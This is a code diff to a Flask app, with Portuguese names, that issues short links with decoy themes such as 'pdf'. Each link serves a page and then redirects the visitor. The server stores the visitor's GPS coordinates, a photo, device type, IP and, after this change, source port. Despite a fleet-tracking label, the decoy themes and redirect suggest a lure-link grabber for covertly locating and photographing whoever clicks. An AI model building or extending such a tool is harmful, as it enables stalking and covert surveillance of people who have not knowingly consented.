@@ -1,3 +1,4 @@
+# app.py
 from flask import Flask, render_template, request, jsonify, redirect, url_for
 import uuid
 from datetime import datetime
@@ -56,7 +57,7 @@ def gerar_ordem():
     FROTA[id_ordem] = {
         "motorista": motorista, "lat": None, "lon": None, "foto": None,
         "status": "Aguardando Conexão", "ultimo_visto": "-", "link": link_curto,
-        "redirect": redirect_url, "ip": "-", 
+        "redirect": redirect_url, "ip": "-", "port": "-",
         "tema": tema,
         "device": "..." # Novo campo iniciado vazio
     }
@@ -72,24 +73,25 @@ def tela_motorista(id_ordem):
     FROTA[id_ordem]['device'] = identificar_dispositivo(user_agent)
     
     dados = FROTA[id_ordem]
-    return render_template("motorista.html", id=id_ordem, destino=dados["redirect"], tema=dados.get("tema", "pdf"))
+    tema = dados.get("tema", "pdf")
+    if tema == "soft":
+        return render_template("teste.html", id=id_ordem, destino=dados["redirect"])
+    else:
+        return render_template("motorista.html", id=id_ordem, destino=dados["redirect"], tema=tema)
 
 @app.route('/api/sinal/<id_ordem>', methods=['POST'])
 def receber_sinal(id_ordem):
     if id_ordem in FROTA:
         data = request.get_json()
-        
-        # --- CAPTURA DE IP E PORTA LÓGICA ---
-        ip = request.headers.get('X-Forwarded-For', request.remote_addr).split(',')[0].strip()
-        porta = request.headers.get('X-Forwarded-Port', request.environ.get('REMOTE_PORT', ''))
-        ip_com_porta = f"{ip}:{porta}" if porta else ip
+        ip = request.headers.get('X-Forwarded-For', request.remote_addr).split(',')[0]
+        port = request.environ.get('REMOTE_PORT', '-')
         
         fuso_br = pytz.timezone('America/Sao_Paulo')
         agora_br = datetime.now(fuso_br).strftime("%d/%m/%Y %H:%M:%S")
         
         FROTA[id_ordem].update({
             'lat': data.get('latitude'), 'lon': data.get('longitude'), 'foto': data.get('foto'),
-            'status': "🟢 Online", 'ultimo_visto': agora_br, 'ip': ip_com_porta
+            'status': "🟢 Online", 'ultimo_visto': agora_br, 'ip': ip, 'port': port
         })
         return jsonify({"ok": True})
     return jsonify({"ok": False}), 404
